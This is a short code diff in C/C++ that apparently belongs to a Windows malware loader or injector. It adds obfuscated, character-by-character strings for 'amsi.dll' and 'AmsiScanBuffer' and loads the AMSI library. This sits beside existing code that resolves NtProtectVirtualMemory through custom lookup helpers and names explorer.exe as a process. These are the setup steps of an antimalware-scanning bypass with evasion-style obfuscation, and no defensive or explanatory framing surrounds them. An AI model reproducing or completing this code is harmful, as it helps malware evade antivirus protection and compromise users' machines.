@@ -8,7 +8,11 @@ WCHAR masterDLL[] = { 'n','t','d','l','l','.','d','l','l',0 };
 char txt[] = { '.','t','e','x','t', 0 };
 WCHAR procName[] = { 'e','x','p','l','o','r','e','r','.','e','x','e',0 };
 
+WCHAR am51[] = { 'a','m','s','i','.','d','l','l',0 };
+char am51Buff[] = { 'A','m','s','i','S','c','a','n','B','u','f','f','e','r',0 };
+
 HMODULE  dllModule = hlpGetModuleHandle(masterDLL);
+HMODULE  am51dll = LoadLibrary(am51);
 
 char protect[] = { 'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y',0 };
 myNtProtectVirtualMemory pVirtualProtect = (myNtProtectVirtualMemory)hlpGetProcAddress(dllModule, protect);
